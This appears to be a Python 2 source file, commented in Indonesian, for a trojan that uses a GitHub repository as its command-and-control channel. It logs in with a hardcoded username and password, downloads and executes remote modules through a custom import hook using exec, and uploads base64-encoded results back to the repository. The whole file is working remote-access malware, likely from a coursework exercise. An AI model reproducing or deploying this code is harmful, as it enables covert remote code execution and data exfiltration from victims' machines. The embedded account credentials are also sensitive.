import sys
import random
import imp
import threading
import time
import json
import base64
import os
import Queue
from github3 import login

trojan_id = "belajar" # nama repository dari github 
trojan_config = "%s.json" %(trojan_id) # buat ambil nama dari file config kita samaain dengan repository kita
configured = False 
have_task = False 
trojan_modules = [] 
data_path = "data/%s/" %(trojan_id) 
task_queue = Queue.Queue() 

def connect_github():
	# -- 
	# Buat Connect ke GitHub Kita
	# --
	gh = login(username="advancenetprog",password="advnetprog1")
	# -- 
	# advancenetprog sama nama repository kita
	# --
	repo = gh.repository ("advancenetprog","belajar")
	branch = repo.branch("master")
	return gh,repo,branch

def get_file_content(filepath):
	gh ,repo,brach= connect_github()
	# -- 
	# Buat Connect ke Branchnya Github
	# -- 
	tree = brach.commit.commit.tree.recurse()

	# -- 
	# jika FilePath Kita Berada di Tree
	# Jadiin filename kita dalam bentuk BLOB (didecode dalam bentuk BLOB)
	# Terus Kita Ambil BLOD contentnya
	#--
	for filename in tree.tree:
		if filepath in filename.path:
			print " Found file %s" %(filepath)
			blob = repo.blob(filename._json_data["sha"])
			return blob.content
	return None

def get_trojan_config():
	global configured
	config_json = get_file_content(trojan_config)
	config = json.loads(base64.b64decode(config_json))
	configured = True

	for task in config:
		if task["module"] not in sys.modules:
			exec("import %s" %task["module"])
	return config

def store_module_data(data): # fungsi untuk menyimpan data ke dalam folder data kita di github kita
	print "storing %s" %(data)
	gh ,repo,brach = connect_github()
	path = "data/%s/%s.data" %(trojan_id,random.randint(1,100000)) # simpan dalam bentuk nama angka supaya gx sering ketimpa
	repo.create_file(path," commit data komputer" , base64.b64encode(data))
	return

class GitImporter(object):
	def __init__(self):
		self.current_module= ""

	def find_module(self, fullname, path=None):
		if configured:
			new_lib = get_file_content("modules/%s" %fullname)
			if new_lib is not None:
				self.current_module = base64.b64decode(new_lib)
				return self
		return None

	def load_module(self,name):
		module = imp.new_module(name)
		exec self.current_module in module.__dict__
		sys.modules[name] = module
		return module

def module_runner(name_module):
	task_queue.put(1) # Queue buat supaya module kita tidak jalan secara barengan, supaya lebih ringan
	result = sys.modules[name_module].run() # menjalankan module kita
	task_queue.get()
	store_module_data(result)
	return

sys.meta_path = [GitImporter()]

connect_github() # panggil fungsi buat connect ke githubnya
config = get_trojan_config()

while True:
	if task_queue.empty():
		for task in config:
			t = threading.Thread(target=module_runner, args=(task["module"],))
			t.start()
			time.sleep(5)